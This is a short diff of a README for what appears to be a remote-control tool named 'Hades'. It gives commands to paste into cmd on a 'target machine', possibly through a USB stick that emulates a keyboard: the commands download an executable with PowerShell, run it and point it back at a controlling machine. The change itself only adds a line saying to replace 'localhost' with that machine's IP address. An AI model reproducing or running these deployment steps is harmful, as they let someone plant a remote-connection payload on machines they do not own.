@@ -42,7 +42,7 @@ Here is the list of used libraries, you can download all of them using `npm inst
 This can be usefull for exemple if you want to use a USB stick which emulate a keyboard when you plug it into a machine.
 
 ### Window
-Copy and paste the commands in a cmd on a target machine
+Copy and paste the commands in a cmd on a target machine.
 
 ```bash
 cd %TEMP%
@@ -50,6 +50,8 @@ powershell wget "https://github.com/AntoineBRTL/Hades/releases/download/1.0/hade
 h.exe -c localhost
 exit
 ```
+
+Change `localhost` with the ip of the main machine.
 
 ### Linux 
 Not done yet
